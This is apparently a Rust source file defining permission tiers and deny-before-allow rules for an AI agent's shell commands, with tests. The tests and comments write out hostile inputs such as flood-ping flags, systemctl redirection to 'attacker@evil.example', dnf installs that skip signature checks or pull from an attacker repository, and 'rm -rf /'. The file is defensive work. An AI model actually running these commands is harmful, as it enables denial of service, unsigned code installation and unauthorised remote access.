use super::{Effect, Rule};
use regex::Regex;

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize, clap::ValueEnum)]
#[serde(rename_all = "lowercase")]
pub enum TierName {
    Safe,
    Standard,
    Unrestricted,
}

fn allow(command: &str, arg_pattern: Option<&str>) -> Rule {
    Rule {
        command: command.to_string(),
        arg_pattern: arg_pattern.map(|p| Regex::new(p).unwrap()),
        effect: Effect::Allow,
    }
}

fn deny(command: &str, arg_pattern: &str) -> Rule {
    Rule {
        command: command.to_string(),
        arg_pattern: Some(Regex::new(arg_pattern).unwrap()),
        effect: Effect::Deny,
    }
}

// NOTE (post-review fix, tier-level defence in depth): the `--` separators
// added to the structured tool handlers (dnf.rs, network.rs, systemctl.rs)
// only harden those handlers. `run_command` reaches the same binaries
// straight through the policy layer, which is the actual security boundary,
// so any dangerous flag the tier rules do not exclude is reachable in one
// call regardless of what the tool files do. The deny-before-allow rules
// below close the specific gaps found in review. `PolicyEngine::evaluate`
// is first-match-wins, so each `Deny` must precede the broad `Allow` for
// the same command.

/// Flood-ping and interval-abuse flags. `ping -f` (and `-i` with a
/// sub-second interval) turns a tier documented as "read-only diagnostics,
/// no mutation of system state" into an outbound denial-of-service tool.
/// The alternation is deliberately anchored to token starts so an ordinary
/// `ping -c 4 host` (or a hostname merely containing an `f`) is unaffected.
/// The first alternative matches a short-option token containing `f`,
/// including clustered forms with an attached value such as `-fc100`
/// (getopt parses this as `-f -c 100`, i.e. flood ping with count 100);
/// ping's only short option using `f` is `--flood`, so there is no
/// legitimate flag this rejects. The interval alternative is likewise
/// extended to clustered forms such as `-ci0.01`.
///
/// Four further gaps were closed in the adversarial review pass:
/// * `-i 0` (a bare integer zero) is accepted by real `ping` and floods
///   just as effectively as `-i 0.01`, but the old pattern required a
///   literal decimal point, so it sailed through. The interval alternative
///   now matches either a fractional value (`0.01`, `.001`) or an
///   all-zero integer value (`0`, `00`) terminated by whitespace or the
///   end of the string. It deliberately does *not* match `-i 1` or
///   `-i 10`, which are ordinary intervals.
/// * `-A` (adaptive ping) paces packets to the round-trip time, which on a
///   LAN is flood ping by another name.
/// * `-l <n>` (preload) blasts `n` packets before waiting for any reply.
/// * `-s <n>` (packet size) is the oversized-packet DoS vector already
///   named in the comment in `src/tools/network.rs`, but never actually
///   added here.
///
/// All four use the same `(?:^|\s)-[A-Za-z]*X` token shape as the existing
/// alternatives, so only an option-looking token starting with `-` at a
/// token boundary can trip them. A hostname containing the same letter
/// (`fedoraproject.org`, `my-fileserver.local`) cannot, because its `-` is
/// never preceded by whitespace or the start of the string. `A`, `l` and
/// `s` are matched case-sensitively, and no other `ping` option uses those
/// exact letters in those exact cases, so nothing legitimate is rejected.
const PING_ABUSE_FLAGS: &str = concat!(
    r"(?:^|\s)-[A-Za-z]*f",
    r"|--flood",
    r"|(?:^|\s)-[A-Za-z]*i\s*(?:0*\.\d|0+(?:\s|$))",
    r"|(?:^|\s)-[A-Za-z]*A",
    r"|(?:^|\s)-[A-Za-z]*l",
    r"|(?:^|\s)-[A-Za-z]*s",
);

/// systemctl flags that redirect the operation away from the local system.
/// `--host`/`-H` runs the command against a remote machine over SSH,
/// `--machine`/`-M` against a local container, and `--root` against an
/// arbitrary filesystem tree. `--host` in particular turns the `safe`
/// tier's read-only `systemctl status` into an arbitrary outbound SSH
/// connection using this machine's identity.
///
/// `src/tools/systemctl.rs` already inserts a `--` separator so its own
/// argv builders cannot be tricked this way, but that only protects the
/// structured tools. `run_command` reaches `systemctl` straight through the
/// policy engine, where `status --host=attacker@evil.example sshd` still
/// matches the `^status` allow pattern. This deny closes that path, the
/// same way `PING_ABUSE_FLAGS` and `DNF_TRUST_BYPASS_FLAGS` close theirs.
///
/// Placed in `safe_rules()`, which `standard_rules()` extends rather than
/// replaces, so a single rule precedes both the `^status` allow (safe) and
/// the `^(start|stop|...)` allow (standard) under first-match-wins.
const SYSTEMCTL_HOST_REDIRECT_FLAGS: &str =
    r"(?:^|\s)--(?:host|machine|root)|(?:^|\s)-[A-Za-z]*[HM]";

/// Flags that defeat dnf's integrity and repository trust model:
/// `--nogpgcheck` skips signature verification, `--repofrompath` adds an
/// attacker-controlled repository for the duration of the transaction, and
/// `--setopt` can reach either of those (and more) indirectly. The tier's
/// `^(install|remove|upgrade)` allow pattern matches the leading subcommand
/// only and says nothing about the flags that follow it.
///
/// The patterns match *prefixes*, not the full flag names. dnf's CLI is
/// argparse-based with `allow_abbrev` left at its default, so any
/// unambiguous prefix of a long option is accepted: `dnf install
/// --nogpgchec pkg` disables signature checking exactly as `--nogpgcheck`
/// does, while containing neither the substring `nogpgcheck` nor anything
/// the old pattern matched. Each prefix below is the shortest form that is
/// still unambiguous to dnf itself, so every abbreviation dnf would accept
/// necessarily contains it:
/// * `--nog` — the other `--no*` options are `--nobest`, `--nodocs`,
///   `--noautoremove` and `--noplugins`, so `--nog` already resolves
///   uniquely to `--nogpgcheck`.
/// * `--repof` — `--repo` is itself a real option, so the shortest
///   unambiguous prefix of `--repofrompath` is one character longer.
/// * `--set` — no other dnf option begins `--set`.
///
/// Requiring the leading `--` keeps these short prefixes from matching a
/// package name that merely happens to contain the same letters.
const DNF_TRUST_BYPASS_FLAGS: &str = r"--nog|--repof|--set";

/// journalctl subcommands and flags that write to `/var/log/journal`
/// rather than read from it. `--setup-keys` generates and writes Forward
/// Secure Sealing keys, so it belongs with the vacuum/rotate family even
/// though its name does not suggest mutation.
const JOURNALCTL_MUTATION_FLAGS: &str =
    r"vacuum|--rotate|--flush|--sync|--relinquish-var|--setup-keys";

fn safe_rules() -> Vec<Rule> {
    vec![
        deny("systemctl", SYSTEMCTL_HOST_REDIRECT_FLAGS),
        allow("systemctl", Some("^status")),
        allow("systemctl", Some("^is-active")),
        allow("systemctl", Some("^is-enabled")),
        deny("journalctl", JOURNALCTL_MUTATION_FLAGS),
        allow("journalctl", None),
        deny("ping", PING_ABUSE_FLAGS),
        allow("ping", None),
        allow(
            "ip",
            Some(r"^(addr|route|link)(\s+(show|list|get)(\s.*)?)?$"),
        ),
    ]
}

fn standard_rules() -> Vec<Rule> {
    let mut rules = safe_rules();
    rules.extend(vec![
        allow("systemctl", Some("^(start|stop|restart|enable|disable)")),
        deny("dnf", DNF_TRUST_BYPASS_FLAGS),
        allow("dnf", Some("^(install|remove|upgrade)")),
        allow("rpm-ostree", Some("^(install|upgrade|status|uninstall)")),
    ]);
    rules
}

pub fn rules_for_tier(tier: &TierName) -> Vec<Rule> {
    match tier {
        TierName::Safe => safe_rules(),
        TierName::Standard => standard_rules(),
        TierName::Unrestricted => vec![Rule {
            command: String::new(),
            arg_pattern: None,
            effect: Effect::Allow,
        }],
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::{Decision, PolicyEngine};

    #[test]
    fn safe_tier_allows_systemctl_status_but_denies_stop() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("systemctl", &["status".into(), "sshd".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("systemctl", &["stop".into(), "sshd".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn safe_tier_denies_dnf_and_raw_run_command_entirely() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("dnf", &["install".into(), "-y".into(), "htop".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn standard_tier_allows_systemctl_stop_and_dnf_install() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        assert!(matches!(
            engine.evaluate("systemctl", &["stop".into(), "sshd".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("dnf", &["install".into(), "-y".into(), "htop".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn standard_tier_still_denies_arbitrary_raw_commands() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        assert!(matches!(
            engine.evaluate("rm", &["-rf".into(), "/".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn unrestricted_tier_allows_anything() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Unrestricted));
        assert!(matches!(
            engine.evaluate("rm", &["-rf".into(), "/".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn safe_tier_denies_ip_mutation_but_allows_ip_show() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate(
                "ip",
                &[
                    "addr".into(),
                    "add".into(),
                    "10.0.0.1/24".into(),
                    "dev".into(),
                    "eth0".into()
                ]
            ),
            Decision::Denied(_)
        ));
        assert!(matches!(
            engine.evaluate("ip", &["addr".into(), "show".into(), "eth0".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("ip", &["addr".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn safe_tier_denies_journalctl_vacuum_but_allows_ordinary_query() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("journalctl", &["--vacuum-time=1s".into()]),
            Decision::Denied(_)
        ));
        assert!(matches!(
            engine.evaluate("journalctl", &["-u".into(), "sshd".into()]),
            Decision::Allowed
        ));
    }

    // The tests below exercise the `run_command`-shaped path: a bare
    // command plus raw argv, evaluated by the policy engine with no
    // structured tool handler in between. That is the boundary the `--`
    // separators in the tool files do not cover.

    #[test]
    fn safe_tier_denies_flood_ping_but_allows_an_ordinary_ping() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        for denied in [
            vec!["-f".to_string(), "8.8.8.8".to_string()],
            vec!["--flood".to_string(), "8.8.8.8".to_string()],
            vec![
                "-c".to_string(),
                "100".to_string(),
                "-f".to_string(),
                "8.8.8.8".to_string(),
            ],
            vec!["-fc".to_string(), "100".to_string(), "8.8.8.8".to_string()],
            // Clustered short options with an attached value: getopt parses
            // `-fc100` as `-f -c 100` (flood ping, count 100).
            vec!["-fc100".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0.01".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), ".001".to_string(), "8.8.8.8".to_string()],
            vec!["-i0.01".to_string(), "8.8.8.8".to_string()],
            // Clustered form of the interval flag: `-ci0.01` is `-c -i 0.01`.
            vec!["-ci0.01".to_string(), "8.8.8.8".to_string()],
            // A bare integer zero interval floods just as effectively as a
            // fractional one, and the pattern used to require a decimal
            // point.
            vec!["-i".to_string(), "0".to_string(), "8.8.8.8".to_string()],
            vec!["-i0".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "00".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0".to_string()],
            // Adaptive ping: paced to the round-trip time, which on a LAN
            // is flood ping under another name.
            vec!["-A".to_string(), "8.8.8.8".to_string()],
            vec!["-cA".to_string(), "4".to_string(), "8.8.8.8".to_string()],
            // Preload: blasts n packets before waiting for a reply.
            vec!["-l".to_string(), "1000".to_string(), "8.8.8.8".to_string()],
            // Oversized packets, the DoS vector named in network.rs.
            vec!["-s".to_string(), "65000".to_string(), "8.8.8.8".to_string()],
        ] {
            assert!(
                matches!(engine.evaluate("ping", &denied), Decision::Denied(_)),
                "ping {denied:?} should be denied under the safe tier"
            );
        }

        for allowed in [
            vec!["8.8.8.8".to_string()],
            vec!["-c".to_string(), "4".to_string(), "8.8.8.8".to_string()],
            vec![
                "-c".to_string(),
                "4".to_string(),
                "-i".to_string(),
                "1".to_string(),
                "example.com".to_string(),
            ],
            // A hostname that merely contains an `f` must not trip the
            // flood-flag pattern.
            vec![
                "-c".to_string(),
                "4".to_string(),
                "fedoraproject.org".to_string(),
            ],
            vec![
                "-w".to_string(),
                "5".to_string(),
                "my-fileserver.local".to_string(),
            ],
            // Ordinary integer intervals must survive the `-i 0` fix: only
            // an all-zero value is a flood.
            vec!["-i".to_string(), "1".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "10".to_string(), "8.8.8.8".to_string()],
            // Uppercase `-S` (sndbuf) is a different option from `-s`, and
            // the deny alternatives are case-sensitive.
            vec!["-S".to_string(), "1024".to_string(), "8.8.8.8".to_string()],
            // A hostname whose embedded hyphen is not at a token boundary
            // must not trip the new single-letter alternatives.
            vec![
                "-c".to_string(),
                "4".to_string(),
                "host-alpha.local".to_string(),
            ],
            vec![
                "-c".to_string(),
                "4".to_string(),
                "web-server.example".to_string(),
            ],
        ] {
            assert!(
                matches!(engine.evaluate("ping", &allowed), Decision::Allowed),
                "ping {allowed:?} should be allowed under the safe tier"
            );
        }
    }

    #[test]
    fn standard_tier_denies_dnf_trust_bypass_flags_but_allows_a_plain_install() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        for denied in [
            vec![
                "install".to_string(),
                "-y".to_string(),
                "--nogpgcheck".to_string(),
                "htop".to_string(),
            ],
            vec![
                "install".to_string(),
                "-y".to_string(),
                "--repofrompath=evil,http://attacker.example/repo".to_string(),
                "pkg".to_string(),
            ],
            vec![
                "install".to_string(),
                "--setopt=gpgcheck=0".to_string(),
                "htop".to_string(),
            ],
            vec!["upgrade".to_string(), "--nogpgcheck".to_string()],
        ] {
            assert!(
                matches!(engine.evaluate("dnf", &denied), Decision::Denied(_)),
                "dnf {denied:?} should be denied under the standard tier"
            );
        }

        assert!(matches!(
            engine.evaluate("dnf", &["install".into(), "-y".into(), "htop".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("dnf", &["upgrade".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn both_tiers_deny_systemctl_host_redirection_but_allow_ordinary_use() {
        // The `--` separator in src/tools/systemctl.rs protects only the
        // structured tools. These are `run_command`-shaped calls, which
        // reach the policy engine directly, so the tier rules are the only
        // thing standing between a `safe`-tier agent and an outbound SSH
        // connection made with this machine's identity.
        for tier in [TierName::Safe, TierName::Standard] {
            let engine = PolicyEngine::new(rules_for_tier(&tier));
            for denied in [
                vec![
                    "status".to_string(),
                    "--host=attacker@evil.example".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--machine=somecontainer".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--root=/mnt/other".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "-H".to_string(),
                    "attacker@evil.example".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "-M".to_string(),
                    "somecontainer".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "start".to_string(),
                    "--host=attacker@evil.example".to_string(),
                    "sshd".to_string(),
                ],
            ] {
                assert!(
                    matches!(engine.evaluate("systemctl", &denied), Decision::Denied(_)),
                    "systemctl {denied:?} should be denied under the {tier:?} tier"
                );
            }

            // Ordinary reads stay allowed under both tiers, including the
            // `--`-separated argv the structured tool actually builds.
            for allowed in [
                vec!["status".to_string(), "sshd".to_string()],
                vec!["status".to_string(), "--".to_string(), "sshd".to_string()],
            ] {
                assert!(
                    matches!(engine.evaluate("systemctl", &allowed), Decision::Allowed),
                    "systemctl {allowed:?} should be allowed under the {tier:?} tier"
                );
            }
        }

        // Service control is a standard-tier privilege, and it survives the
        // new deny rule sitting ahead of its allow rule.
        let standard = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        for allowed in [
            vec!["stop".to_string(), "sshd".to_string()],
            vec!["restart".to_string(), "--".to_string(), "sshd".to_string()],
        ] {
            assert!(
                matches!(standard.evaluate("systemctl", &allowed), Decision::Allowed),
                "systemctl {allowed:?} should be allowed under the standard tier"
            );
        }
    }

    #[test]
    fn standard_tier_denies_abbreviated_dnf_trust_bypass_flags() {
        // dnf's argparse-based CLI accepts any unambiguous prefix of a long
        // option, so `--nogpgchec` disables signature checking exactly as
        // `--nogpgcheck` does. The deny pattern matches the shortest
        // unambiguous prefix so every accepted abbreviation contains it.
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        for denied in [
            vec![
                "install".to_string(),
                "--nogpgchec".to_string(),
                "pkg".to_string(),
            ],
            vec![
                "install".to_string(),
                "--nog".to_string(),
                "pkg".to_string(),
            ],
            vec![
                "install".to_string(),
                "--repof=evil,http://attacker.example/repo".to_string(),
                "pkg".to_string(),
            ],
            vec![
                "install".to_string(),
                "--setop=gpgcheck=0".to_string(),
                "pkg".to_string(),
            ],
        ] {
            assert!(
                matches!(engine.evaluate("dnf", &denied), Decision::Denied(_)),
                "dnf {denied:?} should be denied under the standard tier"
            );
        }

        // A package name that merely contains the same letters is not a
        // flag, and the required `--` prefix keeps it allowed.
        assert!(matches!(
            engine.evaluate("dnf", &["install".into(), "-y".into(), "nogpgd".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate(
                "dnf",
                &["install".into(), "--repo".into(), "updates".into()]
            ),
            Decision::Allowed
        ));
    }

    #[test]
    fn safe_tier_denies_journalctl_setup_keys() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("journalctl", &["--setup-keys".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn the_safe_tier_denials_are_inherited_by_the_standard_tier() {
        // `standard_rules()` builds on `safe_rules()`, so a regression that
        // reordered or dropped the inherited denies would show up here.
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        assert!(matches!(
            engine.evaluate("ping", &["-f".into(), "8.8.8.8".into()]),
            Decision::Denied(_)
        ));
        assert!(matches!(
            engine.evaluate("journalctl", &["--setup-keys".into()]),
            Decision::Denied(_)
        ));
    }
}
